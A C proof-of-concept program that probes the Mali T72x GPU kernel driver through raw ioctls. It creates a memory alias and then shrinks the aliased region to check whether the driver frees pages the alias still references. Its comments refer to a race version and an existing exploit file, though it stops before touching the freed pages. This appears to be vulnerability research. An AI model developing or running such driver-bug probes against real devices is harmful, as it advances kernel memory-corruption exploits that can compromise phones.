/* mali_alias_toctou.c — Mali T72x alias/shrink diagnostic
 *
 * This file is a source-aligned sanity check for the alias lifetime rules:
 *   1. MEM_ALLOC native region with N pages
 *   2. MEM_ALIAS referencing pages from that region
 *   3. Verify MEM_COMMIT shrink is denied while the alias exists
 *   4. Free the alias and verify the same shrink now succeeds
 *
 * On this Samsung r5p0 driver, alias creation immediately GPU-maps the alias on
 * 32-bit userspace clients. That increments gpu_mappings on each aliased native
 * allocation, so a non-racy shrink should be blocked while the alias is alive.
 *
 * Safe test: checks each step without triggering GPU access to stale pages.
 * Fork in child process with timeout for safety (panic_on_oops=1).
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <stdint.h>

/* Mali UK function IDs */
#define UK_FUNC_ID 512
#define KBASE_FUNC_MEM_ALLOC    (UK_FUNC_ID + 0)
#define KBASE_FUNC_MEM_IMPORT   (UK_FUNC_ID + 1)
#define KBASE_FUNC_MEM_COMMIT   (UK_FUNC_ID + 2)
#define KBASE_FUNC_MEM_QUERY    (UK_FUNC_ID + 3)
#define KBASE_FUNC_MEM_FREE     (UK_FUNC_ID + 4)
#define KBASE_FUNC_MEM_FLAGS_CHANGE (UK_FUNC_ID + 5)
#define KBASE_FUNC_MEM_ALIAS    (UK_FUNC_ID + 6)
#define KBASE_FUNC_SET_FLAGS    (UK_FUNC_ID + 18)
#define KBASE_FUNC_GET_VERSION  (UK_FUNC_ID + 16)

/* Memory flags — r7p0 UK 10.0 layout (from mali_mem_exploit.c) */
#define BASE_MEM_PROT_CPU_RD    (1U << 0)
#define BASE_MEM_PROT_CPU_WR    (1U << 1)
#define BASE_MEM_PROT_GPU_RD    (1U << 2)
#define BASE_MEM_PROT_GPU_WR    (1U << 3)
#define BASE_MEM_PROT_GPU_EX    (1U << 4)
#define BASE_MEM_GROW_ON_GPF    (1U << 9)
#define BASE_MEM_COHERENT_LOCAL (1U << 11)
#define BASE_MEM_CACHED_CPU     (1U << 12)
#define BASE_MEM_SAME_VA        (1U << 17)
#define BASE_MEM_NEED_MMAP      (1U << 18)

/* Query types */
#define KBASE_MEM_QUERY_COMMIT_SIZE 1
#define KBASE_MEM_QUERY_VA_SIZE     2
#define KBASE_MEM_QUERY_FLAGS       3

/* UK header */
typedef union {
    uint32_t id;
    uint32_t ret;
    uint64_t sizeOfUkHeader; /* force 8 byte alignment */
} uk_header;

/* Structures for Mali ioctls — r7p0 UK 10.0 layout (56 bytes) */
struct kbase_uk_mem_alloc {
    uk_header header;
    uint64_t va_pages;
    uint64_t commit_pages;
    uint64_t extent;
    uint32_t flags;
    uint32_t _pad0;
    uint64_t gpu_va;
    uint16_t va_alignment;
    uint8_t  _pad1[6];
};

struct kbase_uk_mem_free {
    uk_header header;
    uint64_t gpu_addr;
};

struct kbase_uk_mem_commit {
    uk_header header;
    uint64_t gpu_addr;
    uint64_t pages;
    uint32_t result_subcode;
    uint32_t padding;
};

struct kbase_uk_mem_query {
    uk_header header;
    uint64_t gpu_addr;
    uint64_t query;
    uint64_t value;
};

struct base_mem_aliasing_info {
    uint64_t handle;
    uint64_t offset;
    uint64_t length;
};

struct kbase_uk_mem_alias {
    uk_header header;
    uint64_t flags;
    uint64_t stride;
    uint64_t nents;
    uint64_t ai;    /* pointer to base_mem_aliasing_info array */
    uint64_t gpu_va;
    uint64_t va_pages;
};

struct kbase_uk_get_version {
    uk_header header;
    uint16_t major;
    uint16_t minor;
};

struct kbase_uk_set_flags {
    uk_header header;
    uint32_t create_flags;
};

static int mali_init(int fd) {
    /* Check version — use raw buffer like existing probes */
    uint8_t buf[64];
    memset(buf, 0, sizeof(buf));

    /* GET_VERSION: id=0 (UKP_FUNC_ID_CHECK_VERSION), major=10 at offset 8 */
    *(uint32_t*)buf = 0; /* id = 0 */
    *(uint16_t*)(buf + 8) = 10; /* major */
    *(uint16_t*)(buf + 10) = 2; /* minor */
    int r = ioctl(fd, _IOC(3, 0x80, 0, 16), buf);
    uint32_t ret = *(uint32_t*)buf;
    uint16_t major = *(uint16_t*)(buf + 8);
    uint16_t minor = *(uint16_t*)(buf + 10);
    printf("GET_VERSION: ioctl=%d ret=%u major=%u minor=%u\n", r, ret, major, minor);
    if (r < 0) return -1;

    /* SET_FLAGS: id=530 (UK_FUNC_ID+18) */
    memset(buf, 0, sizeof(buf));
    *(uint32_t*)buf = 530; /* id = KBASE_FUNC_SET_FLAGS */
    *(uint32_t*)(buf + 8) = 0; /* create_flags */
    r = ioctl(fd, _IOC(3, 0x80, 0, 16), buf);
    ret = *(uint32_t*)buf;
    printf("SET_FLAGS: ioctl=%d ret=%u\n", r, ret);
    if (r < 0) return -1;

    return 0;
}

static void do_test(void) {
    int fd = open("/dev/mali0", O_RDWR);
    if (fd < 0) {
        printf("Failed to open /dev/mali0: %d\n", errno);
        return;
    }
    printf("Opened /dev/mali0: fd=%d\n", fd);

    if (mali_init(fd) < 0) {
        close(fd);
        return;
    }

    /*
     * Diagnostic flow:
     *   1. MEM_ALLOC native (GROW_ON_GPF), 16 pages — flags=0x20f
     *   2. MEM_ALIAS referencing pages 8-15
     *   3. Verify shrink is denied while alias exists
     *   4. Free alias and retry shrink
     */

    /* === Step 1: MEM_ALLOC native region, 16 pages === */
    printf("\n=== Step 1: MEM_ALLOC (16 pages, GROW_ON_GPF) ===\n");
    struct kbase_uk_mem_alloc alloc;
    memset(&alloc, 0, sizeof(alloc));
    alloc.header.id = KBASE_FUNC_MEM_ALLOC;
    alloc.va_pages = 16;
    alloc.commit_pages = 16;
    alloc.extent = 16;  /* grow extent, must be <= va_pages */
    /* 0x20f = CPU_RD|CPU_WR|GPU_RD|GPU_WR|GROW_ON_GPF — known-good.
     * The race version depends on this exact flag set. */
    alloc.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                  BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                  BASE_MEM_GROW_ON_GPF;

    printf("sizeof(alloc)=%zu flags=0x%x\n", sizeof(alloc), alloc.flags);
    if (ioctl(fd, _IOC(3, 0x80, 0, sizeof(alloc)), &alloc) < 0) {
        printf("MEM_ALLOC ioctl failed: %d (%s)\n", errno, strerror(errno));
        close(fd); return;
    }
    printf("MEM_ALLOC: ret=%u gpu_va=0x%llx flags_out=0x%x\n",
           alloc.header.ret, (unsigned long long)alloc.gpu_va, alloc.flags);

    /* Dump raw bytes for struct layout debugging */
    uint8_t *p = (uint8_t*)&alloc;
    printf("Raw alloc bytes:\n");
    for (int i = 0; i < (int)sizeof(alloc); i += 8) {
        printf("  +%2d: %02x%02x%02x%02x %02x%02x%02x%02x\n", i,
               p[i], p[i+1], p[i+2], p[i+3],
               p[i+4], p[i+5], p[i+6], p[i+7]);
    }
    if (alloc.header.ret != 0) {
        printf("MEM_ALLOC failed ret=%u\n", alloc.header.ret);
        close(fd); return;
    }
    uint64_t native_gpu_va = alloc.gpu_va;
    if (native_gpu_va == 0) {
        printf("MEM_ALLOC returned gpu_va=0, aborting\n");
        close(fd); return;
    }
    uint64_t alias_gpu_va = 0;

    /* === Step 2: MEM_ALIAS referencing pages 8-15 of native === */
    printf("\n=== Step 2: MEM_ALIAS (pages 8-15 of native) ===\n");
    struct base_mem_aliasing_info ai;
    memset(&ai, 0, sizeof(ai));
    ai.handle = native_gpu_va;  /* GPU VA of source allocation */
    ai.offset = 8;              /* start at page 8 */
    ai.length = 8;              /* alias 8 pages (pages 8-15) */
    printf("ai: handle=0x%llx offset=%llu length=%llu (sizeof=%zu)\n",
           (unsigned long long)ai.handle,
           (unsigned long long)ai.offset,
           (unsigned long long)ai.length, sizeof(ai));

    struct kbase_uk_mem_alias alias;
    memset(&alias, 0, sizeof(alias));
    alias.header.id = KBASE_FUNC_MEM_ALIAS;
    alias.flags = BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
    alias.stride = 8;  /* VA pages per entry = length of single entry */
    alias.nents = 1;   /* one alias entry */
    alias.ai = (uint64_t)(uintptr_t)&ai;
    printf("alias: flags=0x%llx stride=%llu nents=%llu ai=%p (sizeof=%zu)\n",
           (unsigned long long)alias.flags,
           (unsigned long long)alias.stride,
           (unsigned long long)alias.nents,
           (void*)(uintptr_t)alias.ai, sizeof(alias));

    if (ioctl(fd, _IOC(3, 0x80, 0, sizeof(alias)), &alias) < 0) {
        printf("MEM_ALIAS ioctl failed: %d (%s)\n", errno, strerror(errno));
        goto cleanup;
    }
    printf("MEM_ALIAS: ret=%u gpu_va=0x%llx va_pages=%llu\n",
           alias.header.ret, (unsigned long long)alias.gpu_va,
           (unsigned long long)alias.va_pages);

    if (alias.header.ret != 0) {
        printf("MEM_ALIAS failed (ret=%u) — trying with CPU flags too\n",
               alias.header.ret);
        /* Retry with CPU access flags (some implementations require them) */
        memset(&alias, 0, sizeof(alias));
        alias.header.id = KBASE_FUNC_MEM_ALIAS;
        alias.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD |
                      BASE_MEM_PROT_GPU_WR;
        alias.stride = 8;
        alias.nents = 1;
        alias.ai = (uint64_t)(uintptr_t)&ai;
        if (ioctl(fd, _IOC(3, 0x80, 0, sizeof(alias)), &alias) < 0) {
            printf("MEM_ALIAS retry ioctl failed: %d\n", errno);
            goto cleanup;
        }
        printf("MEM_ALIAS retry: ret=%u gpu_va=0x%llx va_pages=%llu\n",
               alias.header.ret, (unsigned long long)alias.gpu_va,
               (unsigned long long)alias.va_pages);
        if (alias.header.ret != 0) {
            printf("MEM_ALIAS still failing, dumping raw response:\n");
            uint8_t *ap = (uint8_t*)&alias;
            for (int i = 0; i < (int)sizeof(alias); i += 8)
                printf("  +%2d: %02x%02x%02x%02x %02x%02x%02x%02x\n", i,
                       ap[i],ap[i+1],ap[i+2],ap[i+3],
                       ap[i+4],ap[i+5],ap[i+6],ap[i+7]);
            goto cleanup;
        }
    }
    alias_gpu_va = alias.gpu_va;

    /* === Step 3: Alias is already GPU-mapped on this driver === */
    printf("\n=== Step 3: Alias created; shrink should now be blocked ===\n");
    printf("Driver path: kbase_mem_alias() -> kbase_gpu_mmap() -> gpu_mappings++ on aliased allocs\n");

    /* === Step 4: Query commit size (should be 16) === */
    printf("\n=== Step 4: QUERY commit size before shrink ===\n");
    struct kbase_uk_mem_query query;
    memset(&query, 0, sizeof(query));
    query.header.id = KBASE_FUNC_MEM_QUERY;
    query.gpu_addr = native_gpu_va;
    query.query = KBASE_MEM_QUERY_COMMIT_SIZE;
    ioctl(fd, _IOC(3, 0x80, 0, sizeof(query)), &query);
    printf("QUERY: ret=%u commit_pages=%llu (expect 16)\n",
           query.header.ret, (unsigned long long)query.value);

    /* === Step 5: MEM_COMMIT to shrink native → 8 pages === */
    printf("\n=== Step 5: MEM_COMMIT shrink to 8 pages ===\n");
    printf("Diagnostic check: alias should keep gpu_mappings > 1, so shrink should be denied\n");
    struct kbase_uk_mem_commit commit;
    memset(&commit, 0, sizeof(commit));
    commit.header.id = KBASE_FUNC_MEM_COMMIT;
    commit.gpu_addr = native_gpu_va;
    commit.pages = 8;  /* shrink from 16 to 8 committed pages */

    int cr = ioctl(fd, _IOC(3, 0x80, 0, sizeof(commit)), &commit);
    printf("MEM_COMMIT: ioctl=%d ret=%u subcode=%u\n",
           cr, commit.header.ret, commit.result_subcode);

    if (commit.header.ret == 0) {
        printf("\n*** TOCTOU CONFIRMED — SHRINK SUCCEEDED ***\n");
        printf("Pages 8-15 freed while alias @ 0x%llx still references them!\n",
               (unsigned long long)alias_gpu_va);
        printf("Alias points to deallocated physical pages.\n");
        printf("(NOT triggering GPU access — panic_on_oops=1)\n");
    } else {
        printf("Shrink denied (ret=%u sub=%u)\n",
               commit.header.ret, commit.result_subcode);

        /* Diagnostic: try shrink without alias present */
        printf("\n=== Diagnostic: free alias, then retry shrink ===\n");
        struct kbase_uk_mem_free mf;
        memset(&mf, 0, sizeof(mf));
        mf.header.id = KBASE_FUNC_MEM_FREE;
        mf.gpu_addr = alias_gpu_va;
        ioctl(fd, _IOC(3, 0x80, 0, sizeof(mf)), &mf);
        printf("FREE alias: ret=%u\n", mf.header.ret);
        alias_gpu_va = 0;

        memset(&commit, 0, sizeof(commit));
        commit.header.id = KBASE_FUNC_MEM_COMMIT;
        commit.gpu_addr = native_gpu_va;
        commit.pages = 8;
        cr = ioctl(fd, _IOC(3, 0x80, 0, sizeof(commit)), &commit);
        printf("MEM_COMMIT (no alias): ioctl=%d ret=%u sub=%u\n",
               cr, commit.header.ret, commit.result_subcode);
    }

    /* === Step 6: Verify commit size after shrink === */
    printf("\n=== Step 6: QUERY commit size after shrink ===\n");
    memset(&query, 0, sizeof(query));
    query.header.id = KBASE_FUNC_MEM_QUERY;
    query.gpu_addr = native_gpu_va;
    query.query = KBASE_MEM_QUERY_COMMIT_SIZE;
    ioctl(fd, _IOC(3, 0x80, 0, sizeof(query)), &query);
    printf("QUERY: ret=%u commit_pages=%llu (expect 8 if shrink worked)\n",
           query.header.ret, (unsigned long long)query.value);

cleanup:
    /* Free alias if still alive */
    struct kbase_uk_mem_free mfree;
    if (alias_gpu_va) {
        memset(&mfree, 0, sizeof(mfree));
        mfree.header.id = KBASE_FUNC_MEM_FREE;
        mfree.gpu_addr = alias_gpu_va;
        ioctl(fd, _IOC(3, 0x80, 0, sizeof(mfree)), &mfree);
    }
    /* Free native */
    memset(&mfree, 0, sizeof(mfree));
    mfree.header.id = KBASE_FUNC_MEM_FREE;
    mfree.gpu_addr = native_gpu_va;
    ioctl(fd, _IOC(3, 0x80, 0, sizeof(mfree)), &mfree);

    close(fd);
}

int main(void) {
    printf("=== Mali T72x Alias TOCTOU PoC ===\n");
    printf("Target: MEM_ALIAS + MEM_COMMIT shrink race\n\n");

    /* Fork for safety (panic_on_oops=1) */
    pid_t pid = fork();
    if (pid == 0) {
        alarm(10); /* 10 second timeout */
        do_test();
        _exit(0);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status)) {
            printf("\nChild exited: %d\n", WEXITSTATUS(status));
        } else if (WIFSIGNALED(status)) {
            printf("\nChild killed by signal: %d\n", WTERMSIG(status));
        }
    } else {
        perror("fork");
        return 1;
    }

    return 0;
}
